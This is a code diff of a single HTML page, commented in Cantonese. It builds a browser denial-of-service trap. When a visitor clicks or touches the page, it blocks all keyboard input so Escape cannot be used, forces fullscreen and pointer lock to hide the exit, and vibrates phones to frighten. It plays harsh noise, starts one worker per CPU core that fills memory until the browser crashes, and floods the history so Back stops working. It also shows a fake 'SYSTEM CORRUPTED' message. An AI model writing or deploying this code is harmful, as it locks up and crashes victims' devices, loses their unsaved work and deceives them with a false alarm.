@@ -1,73 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>*̸̢͕̳̺̺̰̉̌́̓͆̉̊̍̒</title>
     <style>
-        body { background: black; margin: 0; width: 100vw; height: 100vh; cursor: none; overflow: hidden; }
+        body { background: black; margin: 0; width: 100vw; height: 100vh; cursor: none; overflow: hidden; color: transparent; user-select: none; }
     </style>
 </head>
-<body onclick="launch()">
+<body onclick="launch()" ontouchstart="launch()">
+
     <script>
         let triggered = false;
-        let keysPressed = {};
 
-        // 攔截 M 及 M+G
-        window.addEventListener('keydown', (e) => {
-            const key = e.key.toUpperCase();
-            keysPressed[key] = true;
-            if (key === 'M' || (keysPressed['M'] && keysPressed['G'])) e.preventDefault();
-        }, true);
-        window.addEventListener('keyup', (e) => { delete keysPressed[key] = false; });
+        // 鎖死鍵盤，防止 Esc 走佬
+        window.addEventListener('keydown', (e) => e.preventDefault(), true);
 
         function launch() {
             if (triggered) return;
             triggered = true;
 
-            // 1. 鎖定滑鼠
-            document.body.requestPointerLock();
+            // 1. 手機震動 (Android 專屬，嚇死人)
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
 
-            // 2. Bytebeat
+            // 2. 請求全螢幕 (令佢哋更難搵到關閉掣)
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+            // 3. 鎖定滑鼠 (電腦版專用)
+            if (document.body.requestPointerLock) document.body.requestPointerLock();
+
+            // 4. Bytebeat 雜音
             const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            if (audioCtx.state === 'suspended') audioCtx.resume();
             const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
             let t = 0;
             scriptNode.onaudioprocess = (e) => {
                 const output = e.outputBuffer.getChannelData(0);
                 for (let i = 0; i < 4096; i++) {
-                    let val = (t >> 8 | t << 6 | t >> 5 | t << 9) & 0xFF;
+                    // 加入隨機位移，令聲波次次唔同，避過優化
+                    let val = (t >> (8 + Math.random()) | t << 6 | t >> 5) & 0xFF;
                     output[i] = (val / 128.0) - 1.0;
                     t++;
                 }
             };
             scriptNode.connect(audioCtx.destination);
+            if (audioCtx.state === 'suspended') audioCtx.resume();
 
-            // 3. 瞬爆邏輯
-            setTimeout(() => {
-                const voidData = [];
-                
-                // (A) 先噴出 8 個背景炸彈
-                const blob = new Blob(["while(true){postMessage(Math.random());}"]);
-                const url = URL.createObjectURL(blob);
-                for(let i=0; i<navigator.hardwareConcurrency; i++) {
-                    new Worker(url);
-                }
-
-                // (B) 瞬間填滿 RAM 並鎖死 (不再等待 setTimeout)
-                // 這就是 JavaScript 版本的 while true do ... end
+            // 5. 記憶體黑洞 (背景開火)
+            const workerCode = `
+                const leak = [];
                 while(true) {
                     try {
-                        // 每次循環直接塞 500MB，直到系統崩潰
-                        voidData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
-                        
-                        // 強制渲染負擔
-                        document.title = "CRITICAL_" + Math.random();
-                        window.history.pushState({}, '', Math.random());
-                    } catch (e) {
-                        // 如果 500MB 失敗，用小塊繼續填滿最後的空隙
-                        voidData.push(new Uint8Array(10 * 1024 * 1024));
-                    }
+                        // 隨機大小，令垃圾回收 (GC) 追唔上
+                        const size = Math.floor(Math.random() * 500) + 100;
+                        leak.push(new Uint8Array(size * 1024 * 1024).fill(0x52));
+                    } catch(e) {}
                 }
-            }, 50); // 縮短延遲，實現「即點即爆」
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            // 根據 CPU 核心數開 Worker
+            const threads = navigator.hardwareConcurrency || 8;
+            for(let i = 0; i < threads; i++) {
+                new Worker(url);
+            }
+
+            // 6. 主線程鎖死 (Final Strike)
+            setTimeout(() => {
+                // 喺崩潰前最後一刻改 Title
+                document.body.innerHTML = "<h1 style='color:red; font-family:monospace; text-align:center; padding-top:40vh;'>FATAL ERROR: SYSTEM CORRUPTED</h1>";
+                
+                while(true) {
+                    // 無限增加歷史紀錄，令「上一頁」失效
+                    window.history.pushState(null, null, Math.random().toString(36).substring(7));
+                    // 消耗 CPU 算力
+                    Math.sqrt(Math.random() * 10000000);
+                }
+            }, 50); // 俾 50ms 瀏覽器渲染出紅色字先至死
         }
     </script>
 </body>
